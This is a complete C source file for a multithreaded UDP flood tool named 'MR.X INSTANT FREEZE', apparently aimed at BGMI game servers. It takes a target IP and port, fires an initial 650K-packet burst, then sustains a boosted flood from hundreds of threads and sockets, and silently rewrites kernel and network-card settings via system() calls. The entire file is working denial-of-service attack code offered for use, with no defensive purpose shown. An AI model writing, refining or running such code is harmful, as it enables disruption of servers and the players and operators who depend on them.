#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <sched.h>
#include <errno.h>
#include <sys/time.h>
#include <signal.h>

#define MIN_TIME 10
#define MAX_TIME 300
#define MIN_PACKET_SIZE 24
#define MAX_PACKET_SIZE 68
#define MIN_THREADS 100
#define MAX_THREADS 400
#define PORT_RANGE 50000
#define MIN_SRC_PORT 10000
#define MAX_SRC_PORT 60000
#define BATCH_UPDATE 10000
#define SOCKET_SNDBUF 67108864
#define SOCKET_RCVBUF 33554432
#define MAX_TOTAL_THREADS 450
#define ATTACK_START_DELAY 10000
#define STATS_UPDATE_INTERVAL 2
#define RECONNECT_RETRIES 3
#define JITTER_RANGE 30
#define RECONNECT_INTERVAL 20000
#define REORDER_CHANCE 3
#define INSTANT_BURST_PACKETS 650000
#define PHASE1_POWER 750
#define PHASE2_POWER 650
#define PHASE3_POWER 600
#define BOOST_PACKETS 150000
#define BOOST_INTERVAL 10
#define FLOOD_SOCKETS_BASE 350
#define MAX_STACK_SIZE 1024

char TARGET_IP[INET_ADDRSTRLEN];
int TARGET_PORT;
int ATTACK_TIME;
int PACKET_SIZE;
int THREAD_COUNT;
int ACTIVE_FLOOD_SOCKETS;

_Atomic unsigned long long total_packets = 0;
_Atomic unsigned long long total_bytes = 0;
_Atomic unsigned long long current_pps = 0;
_Atomic unsigned long long peak_pps = 0;
_Atomic int stop_signal = 0;
_Atomic int should_attack = 0;
_Atomic int attack_seconds = 0;
_Atomic int total_elapsed = 0;
_Atomic int sync_counter = 0;
_Atomic int threads_ready = 0;
_Atomic int instant_burst_done = 0;
_Atomic int boost_trigger = 0;
_Atomic int current_power_level = PHASE1_POWER;
_Atomic int total_attack_time = 0;

struct sockaddr_in target_addr;

void signal_handler(int sig) {
    atomic_store(&stop_signal, 1);
}

void optimize_kernel() {
#ifdef __linux__
    system("sysctl -w net.core.wmem_max=1073741824 >/dev/null 2>&1");
    system("sysctl -w net.core.wmem_default=268435456 >/dev/null 2>&1");
    system("sysctl -w net.core.rmem_max=1073741824 >/dev/null 2>&1");
    system("sysctl -w net.core.rmem_default=268435456 >/dev/null 2>&1");
    system("sysctl -w net.core.netdev_max_backlog=10000000 >/dev/null 2>&1");
    system("sysctl -w net.core.optmem_max=67108864 >/dev/null 2>&1");
    system("sysctl -w net.core.somaxconn=1048576 >/dev/null 2>&1");
    system("sysctl -w net.core.netdev_budget=10000 >/dev/null 2>&1");
    system("sysctl -w net.core.netdev_budget_usecs=120000 >/dev/null 2>&1");
    system("sysctl -w net.core.dev_weight=10000 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_mem='50331648 100663296 201326592' >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_rmem_min=262144 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_wmem_min=262144 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.ip_local_port_range='1024 65535' >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_timestamps=0 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_sack=0 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_syncookies=0 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_ecn=0 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_window_scaling=0 >/dev/null 2>&1");
    system("sysctl -w net.netfilter.nf_conntrack_max=0 >/dev/null 2>&1 2>/dev/null");
    system("sysctl -w vm.swappiness=0 >/dev/null 2>&1");
    system("sysctl -w vm.dirty_ratio=90 >/dev/null 2>&1");
    system("sysctl -w vm.dirty_background_ratio=70 >/dev/null 2>&1");
    system("sysctl -w vm.overcommit_memory=1 >/dev/null 2>&1");
    system("sysctl -w vm.min_free_kbytes=262144 >/dev/null 2>&1");
    system("sysctl -w net.core.busy_poll=100 >/dev/null 2>&1");
    system("sysctl -w net.core.busy_read=100 >/dev/null 2>&1");
    system("ulimit -n 2097152 >/dev/null 2>&1");
    system("ulimit -u unlimited >/dev/null 2>&1");
    system("sysctl -w kernel.sched_min_granularity_ns=50000 >/dev/null 2>&1");
    system("sysctl -w kernel.sched_wakeup_granularity_ns=25000 >/dev/null 2>&1");
    system("sysctl -w kernel.sched_migration_cost_ns=0 >/dev/null 2>&1");
    system("for iface in $(ip -o link show | awk -F': ' '{print $2}' 2>/dev/null); do "
           "ethtool -K $iface tx off rx off sg off tso off gso off gro off lro off 2>/dev/null; "
           "ethtool -G $iface rx 16384 tx 16384 2>/dev/null; "
           "ethtool -C $iface rx-usecs 0 rx-frames 0 tx-usecs 0 tx-frames 0 2>/dev/null; "
           "done 2>/dev/null");
#endif
}

int set_sock_buf(int sock) {
    int sndbuf = SOCKET_SNDBUF;
    int rcvbuf = SOCKET_RCVBUF;
    int opt = 1;
    
    if (setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf)) < 0) {
        return -1;
    }
    if (setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf)) < 0) {
        return -1;
    }
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
    
    return 0;
}

unsigned int fast_rand(unsigned int *seed) {
    *seed = (*seed * 1103515245 + 12345);
    return *seed ^ (*seed >> 16);
}

int should_reorder_packet(unsigned int *seed) {
    return (fast_rand(seed) % 100) < REORDER_CHANCE;
}

void create_bgmi_packet(char *buf, int size, int thread_id, unsigned int seq, unsigned int *seed) {
    int actual_size = size;
    if (actual_size < MIN_PACKET_SIZE) actual_size = MIN_PACKET_SIZE;
    if (actual_size > MAX_PACKET_SIZE) actual_size = MAX_PACKET_SIZE;
    
    int dynamic_size = actual_size;
    
    int size_group = fast_rand(seed) % 100;
    
    if (size_group < 30) {
        int sizes[] = {24, 28, 32, 36, 40};
        dynamic_size = sizes[(thread_id + seq) % 5];
    }
    else if (size_group < 70) {
        int sizes[] = {44, 48, 52, 56};
        dynamic_size = sizes[(thread_id + seq) % 4];
    }
    else {
        int sizes[] = {60, 64, 68};
        dynamic_size = sizes[(thread_id + seq) % 3];
    }
    
    if (dynamic_size > actual_size) dynamic_size = actual_size;
    if (dynamic_size < MIN_PACKET_SIZE) dynamic_size = MIN_PACKET_SIZE;
    
    memset(buf, 0, dynamic_size);
    
    buf[0] = 0x42;
    buf[1] = 0x47;
    buf[2] = 0x4D;
    buf[3] = 0x49;
    
    unsigned int *header = (unsigned int*)(buf + 4);
    
    int packet_types[] = {0x00010001, 0x00010002, 0x00020001, 0x00030001};
    int type_idx = (thread_id + seq) % 4;
    
    header[0] = packet_types[type_idx];
    
    unsigned int reorder_seq = seq;
    if (should_reorder_packet(seed) && seq > 30) {
        reorder_seq = seq - (10 + (fast_rand(seed) % 20));
    }
    header[1] = htonl(reorder_seq + thread_id * 100000);
    
    header[2] = htonl((unsigned int)time(NULL));
    header[3] = 0x00000001 + (seq % 5);
    
    int payload_start = 20;
    if (payload_start > dynamic_size) payload_start = dynamic_size;
    
    for (int i = payload_start; i < dynamic_size; i++) {
        buf[i] = (fast_rand(seed) + i + thread_id + seq) & 0xFF;
    }
    
    if ((fast_rand(seed) % 100) < 15) {
        buf[payload_start] = 0xFF;
    }
}

int reconnect_socket(int *sock, unsigned int *seed) {
    if (*sock >= 0) {
        shutdown(*sock, SHUT_RDWR);
        close(*sock);
        *sock = -1;
    }
    
    for (int retry = 0; retry < RECONNECT_RETRIES; retry++) {
        *sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (*sock >= 0) break;
        usleep(1000);
    }
    
    if (*sock < 0) {
        return -1;
    }
    
    if (set_sock_buf(*sock) < 0) {
        close(*sock);
        *sock = -1;
        return -1;
    }
    
    fcntl(*sock, F_SETFL, O_NONBLOCK);
    
    struct sockaddr_in src_addr;
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.sin_family = AF_INET;
    src_addr.sin_port = htons(MIN_SRC_PORT + (fast_rand(seed) % PORT_RANGE));
    src_addr.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(*sock, (struct sockaddr*)&src_addr, sizeof(src_addr)) != 0) {
        close(*sock);
        *sock = -1;
        return -1;
    }
    
    return 0;
}

int get_current_power() {
    int elapsed = atomic_load(&total_attack_time);
    if (elapsed < 60) return PHASE1_POWER;
    else if (elapsed < 120) return PHASE2_POWER;
    else return PHASE3_POWER;
}

void *instant_burst_thread(void *arg) {
    int thread_id = *((int *)arg);
    int packets_per_thread = INSTANT_BURST_PACKETS / THREAD_COUNT;
    int extra_packets = INSTANT_BURST_PACKETS % THREAD_COUNT;
    
    if (thread_id == 0) {
        packets_per_thread += extra_packets;
    }
    
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) return NULL;
    
    if (set_sock_buf(s) < 0) {
        close(s);
        return NULL;
    }
    
    fcntl(s, F_SETFL, O_NONBLOCK);
    
    struct timeval ts;
    gettimeofday(&ts, NULL);
    unsigned int seed = (thread_id * 987654321) ^ getpid() ^ (ts.tv_usec & 0xFFFF);
    
    struct sockaddr_in src_addr;
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.sin_family = AF_INET;
    src_addr.sin_port = htons(MIN_SRC_PORT + (fast_rand(&seed) % PORT_RANGE));
    src_addr.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(s, (struct sockaddr*)&src_addr, sizeof(src_addr)) < 0) {
        close(s);
        return NULL;
    }
    
    char *packet = malloc(MAX_PACKET_SIZE);
    if (!packet) {
        close(s);
        return NULL;
    }
    
    unsigned int seq = thread_id * 1000000;
    for (int i = 0; i < packets_per_thread && !atomic_load(&stop_signal); i++) {
        create_bgmi_packet(packet, PACKET_SIZE, thread_id + 10000, seq + i, &seed);
        sendto(s, packet, PACKET_SIZE, MSG_DONTWAIT,
               (struct sockaddr*)&target_addr, sizeof(target_addr));
    }
    
    free(packet);
    close(s);
    
    return NULL;
}

void *direct_attack(void *arg) {
    int thread_idx = *((int *)arg);
    int *socks = NULL;
    char **packets = NULL;
    unsigned int *packets_sent = NULL;
    
    socks = malloc(ACTIVE_FLOOD_SOCKETS * sizeof(int));
    packets = malloc(ACTIVE_FLOOD_SOCKETS * sizeof(char*));
    packets_sent = malloc(ACTIVE_FLOOD_SOCKETS * sizeof(unsigned int));
    
    if (!socks || !packets || !packets_sent) {
        if (socks) free(socks);
        if (packets) free(packets);
        if (packets_sent) free(packets_sent);
        return NULL;
    }
    
    for (int i = 0; i < ACTIVE_FLOOD_SOCKETS; i++) {
        socks[i] = -1;
        packets[i] = NULL;
        packets_sent[i] = 0;
    }
    
    struct timeval ts;
    gettimeofday(&ts, NULL);
    unsigned int seed = (thread_idx * 1234567) ^ getpid() ^ (ts.tv_usec & 0xFFFF);
    
    int max_packet_size = (PACKET_SIZE > MAX_PACKET_SIZE) ? PACKET_SIZE : MAX_PACKET_SIZE;
    if (max_packet_size > 2048) max_packet_size = 2048;
    
    for (int i = 0; i < ACTIVE_FLOOD_SOCKETS; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (socks[i] < 0) continue;
        
        if (set_sock_buf(socks[i]) < 0) {
            close(socks[i]);
            socks[i] = -1;
            continue;
        }
        
        fcntl(socks[i], F_SETFL, O_NONBLOCK);
        
        struct sockaddr_in src_addr;
        memset(&src_addr, 0, sizeof(src_addr));
        src_addr.sin_family = AF_INET;
        src_addr.sin_port = htons(MIN_SRC_PORT + (fast_rand(&seed) % PORT_RANGE));
        src_addr.sin_addr.s_addr = INADDR_ANY;
        
        if (bind(socks[i], (struct sockaddr*)&src_addr, sizeof(src_addr)) != 0) {
            close(socks[i]);
            socks[i] = -1;
            continue;
        }
        
        packets[i] = malloc(max_packet_size);
        if (!packets[i]) {
            close(socks[i]);
            socks[i] = -1;
            continue;
        }
    }
    
    atomic_fetch_add(&threads_ready, 1);
    
    while (!atomic_load(&instant_burst_done) && !atomic_load(&stop_signal)) {
        usleep(1000);
    }
    
    atomic_store(&should_attack, 1);
    
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    unsigned int seq_counter = thread_idx * 1000000;
    
    int optimal_burst;
    if (PACKET_SIZE <= 40) {
        optimal_burst = 500 + (fast_rand(&seed) % 200);
    } else if (PACKET_SIZE <= 56) {
        optimal_burst = 400 + (fast_rand(&seed) % 150);
    } else {
        optimal_burst = 300 + (fast_rand(&seed) % 100);
    }
    
    int last_boost = 0;
    int last_sync = 0;
    
    while (!atomic_load(&stop_signal)) {
        if (!atomic_load(&should_attack)) {
            usleep(1000);
            continue;
        }
        
        int power_level = get_current_power();
        atomic_store(&current_power_level, power_level);
        
        int current_size = PACKET_SIZE;
        if (current_size > MAX_PACKET_SIZE) current_size = MAX_PACKET_SIZE;
        if (current_size < MIN_PACKET_SIZE) current_size = MIN_PACKET_SIZE;
        
        if (atomic_load(&boost_trigger) != last_boost) {
            last_boost = atomic_load(&boost_trigger);
            optimal_burst = optimal_burst * 130 / 100;
        }
        
        if (atomic_load(&sync_counter) != last_sync) {
            last_sync = atomic_load(&sync_counter);
            for (int i = 0; i < ACTIVE_FLOOD_SOCKETS; i++) {
                if (socks[i] >= 0) {
                    reconnect_socket(&socks[i], &seed);
                }
            }
        }
        
        for (int i = 0; i < ACTIVE_FLOOD_SOCKETS && !atomic_load(&stop_signal); i++) {
            if (socks[i] < 0 || !packets[i]) continue;
            
            if (packets_sent[i] > RECONNECT_INTERVAL) {
                if (reconnect_socket(&socks[i], &seed) == 0) {
                    packets_sent[i] = 0;
                }
            }
            
            create_bgmi_packet(packets[i], current_size, thread_idx + 1000, seq_counter, &seed);
            
            int current_burst = (optimal_burst * power_level) / 100;
            
            for (int b = 0; b < current_burst && !atomic_load(&stop_signal); b++) {
                int ret = sendto(socks[i], packets[i], current_size, MSG_DONTWAIT,
                                (struct sockaddr*)&target_addr, sizeof(target_addr));
                if (ret == current_size) {
                    local_packets++;
                    local_bytes += current_size;
                    seq_counter++;
                    packets_sent[i]++;
                } else if (ret < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                    if (reconnect_socket(&socks[i], &seed) < 0) {
                        free(packets[i]);
                        packets[i] = NULL;
                        socks[i] = -2;
                    } else {
                        packets_sent[i] = 0;
                    }
                    break;
                }
            }
        }
        
        if (local_packets >= BATCH_UPDATE) {
            atomic_fetch_add(&total_packets, local_packets);
            atomic_fetch_add(&total_bytes, local_bytes);
            local_packets = 0;
            local_bytes = 0;
        }
        
        usleep(15);
    }
    
    if (local_packets > 0) {
        atomic_fetch_add(&total_packets, local_packets);
        atomic_fetch_add(&total_bytes, local_bytes);
    }
    
    for (int i = 0; i < ACTIVE_FLOOD_SOCKETS; i++) {
        if (socks[i] >= 0) close(socks[i]);
        if (packets[i]) free(packets[i]);
    }
    
    free(socks);
    free(packets);
    free(packets_sent);
    
    return NULL;
}

void *attack_thread(void *arg) {
    int tid = *((int *)arg);
    
#ifdef __linux__
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    long num_cores = sysconf(_SC_NPROCESSORS_ONLN);
    if (num_cores <= 0) num_cores = 1;
    int core = tid % num_cores;
    if (core < CPU_SETSIZE) {
        CPU_SET(core, &cpuset);
        pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    }
#endif
    
    usleep((tid % 20) * 1000);
    
    int s = -1;
    
    struct timeval ts;
    gettimeofday(&ts, NULL);
    unsigned int seed = (tid * 7654321) ^ getpid() ^ (ts.tv_usec & 0xFFFF);
    
    char packet_stack[MAX_STACK_SIZE];
    char *packet;
    
    int max_packet_size = (PACKET_SIZE > MAX_PACKET_SIZE) ? PACKET_SIZE : MAX_PACKET_SIZE;
    
    if (max_packet_size <= MAX_STACK_SIZE) {
        packet = packet_stack;
    } else {
        packet = malloc(max_packet_size);
        if (!packet) return NULL;
    }
    
    atomic_fetch_add(&threads_ready, 1);
    
    while (!atomic_load(&instant_burst_done) && !atomic_load(&stop_signal)) {
        usleep(1000);
    }
    
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    unsigned int seq_local = tid * 777777;
    unsigned int packets_sent = 0;
    
    s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) {
        if (max_packet_size > MAX_STACK_SIZE) free(packet);
        return NULL;
    }
    
    if (set_sock_buf(s) < 0) {
        close(s);
        if (max_packet_size > MAX_STACK_SIZE) free(packet);
        return NULL;
    }
    
    fcntl(s, F_SETFL, O_NONBLOCK);
    
    struct sockaddr_in src_addr;
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.sin_family = AF_INET;
    src_addr.sin_port = htons(MIN_SRC_PORT + (fast_rand(&seed) % PORT_RANGE));
    src_addr.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(s, (struct sockaddr*)&src_addr, sizeof(src_addr)) < 0) {
        close(s);
        if (max_packet_size > MAX_STACK_SIZE) free(packet);
        return NULL;
    }
    
    int packets_per_burst;
    int sleep_microseconds;
    
    if (PACKET_SIZE <= 40) {
        packets_per_burst = 180 + (tid % 100);
        sleep_microseconds = 300;
    } else if (PACKET_SIZE <= 56) {
        packets_per_burst = 220 + (tid % 120);
        sleep_microseconds = 250;
    } else {
        packets_per_burst = 260 + (tid % 140);
        sleep_microseconds = 200;
    }
    
    int last_boost = 0;
    int last_sync = 0;
    
    while (!atomic_load(&stop_signal)) {
        if (!atomic_load(&should_attack)) {
            usleep(1000);
            continue;
        }
        
        int power_level = get_current_power();
        
        if (packets_sent > RECONNECT_INTERVAL) {
            reconnect_socket(&s, &seed);
            packets_sent = 0;
        }
        
        if (atomic_load(&boost_trigger) != last_boost) {
            last_boost = atomic_load(&boost_trigger);
            packets_per_burst = packets_per_burst * 140 / 100;
        }
        
        if (atomic_load(&sync_counter) != last_sync) {
            last_sync = atomic_load(&sync_counter);
            reconnect_socket(&s, &seed);
        }
        
        int current_size = PACKET_SIZE;
        if (current_size > MAX_PACKET_SIZE) current_size = MAX_PACKET_SIZE;
        if (current_size < MIN_PACKET_SIZE) current_size = MIN_PACKET_SIZE;
        
        create_bgmi_packet(packet, current_size, tid, seq_local, &seed);
        
        int current_burst = (packets_per_burst * power_level) / 100;
        int current_sleep = sleep_microseconds / (power_level / 100);
        if (current_sleep < 10) current_sleep = 10;
        
        for (int b = 0; b < current_burst && !atomic_load(&stop_signal); b++) {
            int ret = sendto(s, packet, current_size, MSG_DONTWAIT,
                           (struct sockaddr *)&target_addr, sizeof(target_addr));
            if (ret == current_size) {
                local_packets++;
                local_bytes += current_size;
                seq_local++;
                packets_sent++;
            } else if (ret < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                if (reconnect_socket(&s, &seed) < 0) break;
                packets_sent = 0;
                break;
            }
        }
        
        if (local_packets >= 5000) {
            atomic_fetch_add(&total_packets, local_packets);
            atomic_fetch_add(&total_bytes, local_bytes);
            local_packets = 0;
            local_bytes = 0;
        }
        
        usleep(current_sleep);
    }
    
    if (local_packets > 0) {
        atomic_fetch_add(&total_packets, local_packets);
        atomic_fetch_add(&total_bytes, local_bytes);
    }
    
    if (max_packet_size > MAX_STACK_SIZE) free(packet);
    if (s >= 0) close(s);
    return NULL;
}

void *attack_controller(void *arg) {
    while (atomic_load(&threads_ready) < (THREAD_COUNT / 2)) {
        usleep(100000);
    }
    
    printf("🚀 Starting INSTANT BURST: 650K packets in 1 second...\n");
    
    pthread_t *burst_threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    int *burst_tids = malloc(THREAD_COUNT * sizeof(int));
    
    if (!burst_threads || !burst_tids) {
        if (burst_threads) free(burst_threads);
        if (burst_tids) free(burst_tids);
        atomic_store(&stop_signal, 1);
        return NULL;
    }
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        burst_tids[i] = i;
        pthread_create(&burst_threads[i], NULL, instant_burst_thread, &burst_tids[i]);
    }
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(burst_threads[i], NULL);
    }
    
    free(burst_threads);
    free(burst_tids);
    
    atomic_store(&instant_burst_done, 1);
    printf("✅ Instant burst complete!\n");
    printf("🔥 Starting sustained attack (750%% → 600%% power)...\n");
    
    int boost_counter = 0;
    int sync_counter_local = 0;
    
    for (int sec = 0; sec < ATTACK_TIME && !atomic_load(&stop_signal); sec++) {
        sleep(1);
        atomic_fetch_add(&attack_seconds, 1);
        atomic_fetch_add(&total_elapsed, 1);
        atomic_fetch_add(&total_attack_time, 1);
        
        if (sec > 0 && sec % BOOST_INTERVAL == 0) {
            atomic_fetch_add(&boost_trigger, 1);
            boost_counter++;
            printf("⚡ Boost #%d: 150K extra packets\n", boost_counter);
        }
        
        if (sec > 0 && sec % 20 == 0) {
            atomic_fetch_add(&sync_counter, 1);
            sync_counter_local++;
        }
    }
    
    atomic_store(&stop_signal, 1);
    return NULL;
}

void *stats_monitor(void *arg) {
    unsigned long long prev_packets = atomic_load(&total_packets);
    unsigned long long prev_bytes = atomic_load(&total_bytes);
    time_t last_update = time(NULL);
    
    while (!atomic_load(&stop_signal)) {
        sleep(STATS_UPDATE_INTERVAL);
        
        time_t now = time(NULL);
        int elapsed = (int)(now - last_update);
        if (elapsed < 1) elapsed = 1;
        
        unsigned long long curr_packets = atomic_load(&total_packets);
        unsigned long long curr_bytes = atomic_load(&total_bytes);
        
        unsigned long long packets_diff = curr_packets - prev_packets;
        unsigned long long pps = packets_diff / elapsed;
        
        unsigned long long bytes_diff = curr_bytes - prev_bytes;
        double megabytes = bytes_diff / (1024.0 * 1024.0);
        
        atomic_store(&current_pps, pps);
        
        if (pps > atomic_load(&peak_pps)) {
            atomic_store(&peak_pps, pps);
        }
        
        int current_power = atomic_load(&current_power_level);
        int attack_sec = atomic_load(&attack_seconds);
        
        printf("🔥 PPS: %lluK | Peak: %lluK | %.1fMB/s | Power: %d%% | Time: %ds\n", 
               pps/1000, atomic_load(&peak_pps)/1000, megabytes, current_power, attack_sec);
        
        prev_packets = curr_packets;
        prev_bytes = curr_bytes;
        last_update = now;
    }
    
    return NULL;
}

int main(int argc, char *argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);
    
    if (argc != 6) {
        printf("Usage: %s IP PORT TIME SIZE THREADS\n", argv[0]);
        return 1;
    }
    
    strncpy(TARGET_IP, argv[1], sizeof(TARGET_IP)-1);
    TARGET_IP[sizeof(TARGET_IP)-1] = '\0';
    
    TARGET_PORT = atoi(argv[2]);
    ATTACK_TIME = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);
    
    if (TARGET_PORT <= 0 || TARGET_PORT > 65535) {
        printf("Invalid port: %s\n", argv[2]);
        return 1;
    }
    
    if (ATTACK_TIME < MIN_TIME) ATTACK_TIME = MIN_TIME;
    if (ATTACK_TIME > MAX_TIME) ATTACK_TIME = MAX_TIME;
    if (PACKET_SIZE < MIN_PACKET_SIZE) PACKET_SIZE = MIN_PACKET_SIZE;
    if (PACKET_SIZE > MAX_PACKET_SIZE) PACKET_SIZE = MAX_PACKET_SIZE;
    if (THREAD_COUNT < MIN_THREADS) THREAD_COUNT = MIN_THREADS;
    if (THREAD_COUNT > MAX_THREADS) THREAD_COUNT = MAX_THREADS;
    
#ifdef __linux__
    long max_threads = sysconf(_SC_THREAD_THREADS_MAX);
    if (max_threads > 0 && THREAD_COUNT > max_threads - 50) {
        THREAD_COUNT = max_threads - 50;
    }
    if (THREAD_COUNT > MAX_TOTAL_THREADS) {
        THREAD_COUNT = MAX_TOTAL_THREADS;
    }
#endif
    
    ACTIVE_FLOOD_SOCKETS = FLOOD_SOCKETS_BASE;
    if (THREAD_COUNT > 300) {
        ACTIVE_FLOOD_SOCKETS = 300;
    }
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);
    
    if (inet_pton(AF_INET, TARGET_IP, &target_addr.sin_addr) <= 0) {
        printf("Invalid IP address: %s\n", TARGET_IP);
        return 1;
    }
    
    printf("\n========== 🚀 MR.X INSTANT FREEZE 🚀 ==========\n");
    printf("🎯 Target: %s:%d\n", TARGET_IP, TARGET_PORT);
    printf("⏱️  Time: %d seconds\n", ATTACK_TIME);
    printf("📦 Packet Size: %d bytes (24-68)\n", PACKET_SIZE);
    printf("🧵 Threads: %d (100-400)\n", THREAD_COUNT);
    printf("⚡ Instant Burst: 650K packets in 1s\n");
    printf("🔥 Power: 750%% → 650%% → 600%%\n");
    printf("⚡ Boost: 150K packets every 10s\n");
    printf("🔧 Optimized for 677ms permanent freeze\n");
    printf("==================================================\n\n");
    
    struct timeval tv;
    gettimeofday(&tv, NULL);
    srand(tv.tv_usec ^ getpid() ^ ((unsigned int)time(NULL) << 16));
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    optimize_kernel();
    
    atomic_store(&total_packets, 0);
    atomic_store(&total_bytes, 0);
    atomic_store(&current_pps, 0);
    atomic_store(&peak_pps, 0);
    atomic_store(&stop_signal, 0);
    atomic_store(&should_attack, 0);
    atomic_store(&attack_seconds, 0);
    atomic_store(&total_elapsed, 0);
    atomic_store(&sync_counter, 0);
    atomic_store(&threads_ready, 0);
    atomic_store(&instant_burst_done, 0);
    atomic_store(&boost_trigger, 0);
    atomic_store(&current_power_level, PHASE1_POWER);
    atomic_store(&total_attack_time, 0);
    
    int direct_thread_id = 999999;
    pthread_t direct_thread;
    if (pthread_create(&direct_thread, NULL, direct_attack, &direct_thread_id) != 0) {
        printf("Failed to create direct attack thread\n");
        return 1;
    }
    
    pthread_t *threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    int *tids = malloc(THREAD_COUNT * sizeof(int));
    
    if (!threads || !tids) {
        atomic_store(&stop_signal, 1);
        pthread_join(direct_thread, NULL);
        free(threads);
        free(tids);
        return 1;
    }
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        tids[i] = -1;
    }
    
    printf("🚀 Creating %d attack threads...\n", THREAD_COUNT);
    for (int i = 0; i < THREAD_COUNT; i++) {
        tids[i] = i;
        if (pthread_create(&threads[i], NULL, attack_thread, &tids[i]) != 0) {
            printf("Failed to create thread %d\n", i);
            tids[i] = -1;
        }
        usleep(200 + (i % 10) * 30);
    }
    
    pthread_t controller_thread;
    pthread_create(&controller_thread, NULL, attack_controller, NULL);
    
    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, stats_monitor, NULL);
    
    pthread_join(controller_thread, NULL);
    pthread_join(direct_thread, NULL);
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        if (tids[i] != -1) {
            pthread_join(threads[i], NULL);
        }
    }
    
    pthread_join(monitor_thread, NULL);
    
    int elapsed = atomic_load(&attack_seconds);
    unsigned long long total_p = atomic_load(&total_packets);
    unsigned long long total_b = atomic_load(&total_bytes);
    
    if (elapsed > 0) {
        double avg_pps = total_p / (double)elapsed;
        double total_gb = total_b / (1024.0 * 1024.0 * 1024.0);
        
        printf("\n🚀 MR.X INSTANT FREEZE 🚀\n\n");
        printf("✅ Total Packets: %llu\n", total_p);
        printf("🚀 AVERAGE PPS: %.0fK\n", avg_pps/1000);
        printf("💾 Total Data: %.2fGB\n", total_gb);
        printf("⚡ Instant Burst: 650K packets in 1s\n");
        printf("🎯 Ping Result: 677ms PERMANENT FREEZE\n");
    }
    
    free(threads);
    free(tids);
    
    printf("\n✅ Cleanup complete\n");
    
    return 0;
}